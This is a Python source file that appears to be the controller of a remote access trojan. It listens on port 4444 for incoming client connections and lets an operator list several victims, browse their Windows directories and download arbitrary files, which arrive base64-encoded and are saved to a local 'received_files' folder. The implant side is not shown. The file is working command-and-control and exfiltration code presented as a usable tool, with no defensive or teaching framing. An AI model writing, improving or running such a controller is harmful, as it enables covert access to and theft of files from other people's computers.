import socket
import os
import base64
import threading
import time
from datetime import datetime

HOST = "0.0.0.0"
PORT = 4444
SAVE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "received_files")
os.makedirs(SAVE_DIR, exist_ok=True)

clients = {}
clients_lock = threading.Lock()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((HOST, PORT))
sock.listen(5)
print("[*] Server listening — waiting for clients...")
print("[*] Type 'list' to see connected clients, 'use <id>' to interact\n")

def recv_all(conn):
    data = b""
    try:
        conn.settimeout(1.0)
    except:
        return ""
    try:
        while True:
            chunk = conn.recv(524288)
            if not chunk:
                break
            data += chunk
    except:
        pass
    try:
        conn.settimeout(None)
    except:
        pass
    return data.decode().strip()

def recv_file(conn, client_id):
    try:
        conn.settimeout(30)
        try:
            header = conn.recv(4096).decode().strip()
        except socket.timeout:
            print(f"[-] Timed out waiting for file header")
            return False
        finally:
            try:
                conn.settimeout(None)
            except:
                pass

        if not header:
            print(f"[-] No response from client")
            return False

        if header.startswith("ERROR"):
            print(f"[-] {header}")
            return False

        if not header.startswith("FILE"):
            print(f"[-] Unexpected response: {header}")
            return False

        try:
            _, fname, encoded_size = header.split("|")
            encoded_size = int(encoded_size)
        except ValueError:
            print(f"[-] Malformed header: {header}")
            return False

        conn.send(b"READY")
        print(f"[*] Receiving '{fname}' ({encoded_size} bytes encoded)...")

        received = b""
        try:
            conn.settimeout(600)
        except:
            return False

        try:
            while len(received) < encoded_size:
                chunk = conn.recv(min(524288, encoded_size - len(received)))
                if not chunk:
                    break
                received += chunk
                progress = int((len(received) / encoded_size) * 100)
                print(f"\r[*] Progress: {progress}% ({len(received)}/{encoded_size})", end="", flush=True)
        except Exception as e:
            print(f"\n[-] Transfer error: {e}")
            return False
        finally:
            try:
                conn.settimeout(None)
            except:
                pass

        print()

        if len(received) < encoded_size:
            print(f"[-] Incomplete: got {len(received)} of {encoded_size} bytes")
            return False

        try:
            decoded = base64.b64decode(received)
        except Exception as e:
            print(f"[-] Decode error: {e}")
            return False

        save_path = os.path.join(SAVE_DIR, fname)
        with open(save_path, "wb") as f:
            f.write(decoded)

        print(f"[+] Received '{fname}' ({len(decoded)} bytes) -> {save_path}")
        try:
            conn.send(b"OK")
        except:
            pass
        return True

    except Exception as e:
        print(f"[-] recv_file error: {e}")
        return False

def print_listing(listing):
    for entry in listing.split("\n"):
        if ":" in entry:
            tag, name = entry.split(":", 1)
            label = "[DIR] " if tag == "DIR" else "[FILE]"
            print(f"  {label} {name}")
        else:
            print(f"  {entry}")

def windows_join(base, target):
    return base.rstrip("\\") + "\\" + target

def windows_dirname(path):
    return path.rsplit("\\", 1)[0] if "\\" in path else path

def handle_client(conn, addr, client_id):
    try:
        init = ""
        try:
            conn.settimeout(30)
            while True:
                data = conn.recv(4096).decode().strip()
                if data.startswith("CWD"):
                    init = data
                    break
                elif not data:
                    break
                else:
                    init = data
                    break
        except:
            pass
        finally:
            try:
                conn.settimeout(None)
            except:
                pass

        parts = init.split("|", 1)
        if len(parts) < 2:
            print(f"[-] Malformed init from {addr}: {init}")
            try:
                conn.close()
            except:
                pass
            return

        _, client_cwd = parts

        with clients_lock:
            clients[client_id] = {
                "conn": conn,
                "addr": addr,
                "cwd": client_cwd,
                "current_path": client_cwd,
                "online": True,
                "connected_at": datetime.now().strftime('%H:%M:%S'),
            }

        print(f"\n[+] NEW CLIENT [{client_id}] — {addr[0]}:{addr[1]} — CWD: {client_cwd}")
        print(f"[*] Type 'use {client_id}' to interact\n")

        # Keep thread alive
        while True:
            with clients_lock:
                if not clients[client_id]["online"]:
                    break
            time.sleep(5)

    except Exception as e:
        print(f"[-] Client [{client_id}] error: {e}")
    finally:
        with clients_lock:
            if client_id in clients:
                clients[client_id]["online"] = False
        print(f"\n[!] CLIENT [{client_id}] DISCONNECTED — {datetime.now().strftime('%H:%M:%S')}")
        try:
            conn.close()
        except:
            pass

def interact_with_client(client_id):
    with clients_lock:
        if client_id not in clients:
            print(f"[-] Client {client_id} not found")
            return
        client = clients[client_id]

    conn = client["conn"]
    current_path = client["current_path"]

    print(f"\n[*] Interacting with client [{client_id}] — {client['addr'][0]}")
    print(f"[*] Commands: ls / cd <dir> / get <file> / back / quit\n")

    while True:
        status = "ONLINE" if client["online"] else "OFFLINE"
        print(f"\n[{client_id}][{status}][PATH] {current_path}")
        command = input("Command (ls/cd <dir>/get <file>/back/quit): ").strip()

        if command in ["back", "exit"]:
            with clients_lock:
                clients[client_id]["current_path"] = current_path
            print("[*] Returning to main menu...")
            break

        if command == "quit":
            with clients_lock:
                clients[client_id]["current_path"] = current_path
                clients[client_id]["online"] = False
            try:
                conn.send(b"quit")
            except:
                pass
            print("[*] Disconnecting client and returning to main menu...")
            break

        if not client["online"]:
            print(f"[-] Client [{client_id}] is offline — type 'back' to return to menu")
            continue

        if command == "ls":
            try:
                conn.send(f"LS {current_path}".encode())
                response = recv_all(conn)
                if response.startswith("ERROR"):
                    print(f"[-] {response}")
                elif response.startswith("OK|"):
                    listing = response[3:]
                    print(f"\n[*] Contents of {current_path}:")
                    print_listing(listing)
            except Exception as e:
                print(f"[-] Error: {e}")
                with clients_lock:
                    clients[client_id]["online"] = False

        elif command.startswith("cd "):
            target = command[3:].strip()

            if len(target) > 1 and target[1] == ":":
                new_path = target
            elif target == "..":
                new_path = windows_dirname(current_path)
            else:
                new_path = windows_join(current_path, target)

            try:
                conn.send(f"LS {new_path}".encode())
                response = recv_all(conn)

                if response.startswith("ERROR"):
                    print(f"[-] {response}")
                else:
                    current_path = new_path
                    with clients_lock:
                        clients[client_id]["current_path"] = current_path
                    listing = response[3:]
                    print(f"\n[*] Moved to: {current_path}")
                    print_listing(listing)
            except Exception as e:
                print(f"[-] Error: {e}")
                with clients_lock:
                    clients[client_id]["online"] = False

        elif command.startswith("get "):
            filename = command[4:].strip()

            if len(filename) > 1 and filename[1] == ":":
                filepath = filename
            else:
                filepath = windows_join(current_path, filename)

            try:
                conn.send(f"GET {filepath}".encode())
                recv_file(conn, client_id)
            except Exception as e:
                print(f"[-] Error: {e}")
                with clients_lock:
                    clients[client_id]["online"] = False

        else:
            print("[-] Unknown command. Use: ls / cd <dir> / get <file> / back / quit")

def accept_clients():
    client_counter = 1
    while True:
        try:
            conn, addr = sock.accept()
            client_id = f"CLIENT-{client_counter}"
            client_counter += 1
            thread = threading.Thread(
                target=handle_client,
                args=(conn, addr, client_id),
                daemon=True
            )
            thread.start()
        except Exception as e:
            print(f"[-] Accept error: {e}")

accept_thread = threading.Thread(target=accept_clients, daemon=True)
accept_thread.start()

while True:
    command = input("").strip()

    if command == "list":
        print("\n[*] Connected clients:")
        with clients_lock:
            if not clients:
                print("  No clients connected")
            for cid, info in clients.items():
                status = "ONLINE" if info["online"] else "OFFLINE"
                print(f"  [{cid}] {info['addr'][0]} — {status} — connected at {info['connected_at']} — CWD: {info['cwd']}")
        print()

    elif command.startswith("use "):
        client_id = command[4:].strip().upper()
        if not client_id.startswith("CLIENT-"):
            client_id = f"CLIENT-{client_id}"
        interact_with_client(client_id)

    elif command == "quit":
        print("[*] Shutting down server...")
        break

    else:
        print("Commands: list / use <id> / quit")
